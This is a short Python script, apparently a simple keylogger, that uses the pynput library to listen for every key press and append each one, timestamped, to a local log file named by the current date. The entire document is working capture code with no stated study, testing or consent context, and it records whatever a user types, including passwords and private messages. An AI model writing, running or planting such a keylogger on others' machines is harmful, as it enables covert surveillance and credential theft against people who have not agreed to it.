#!/usr/bin/env python3

import datetime
from pynput import keyboard
 
def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    fname = createLogName()
    a = open(fname, mode='a+')
    written = '[' + str(datetime.datetime.now()) + '] ' + key_name + '\n'
    a.write(written)
    a.close()

def createLogName():
    timenow = str(datetime.datetime.now()).split(' ')[0]
    string = 'Log' + timenow
    return string

if __name__ == '__main__':
    with keyboard.Listener(
        on_press = on_press) as listener:
        listener.join()
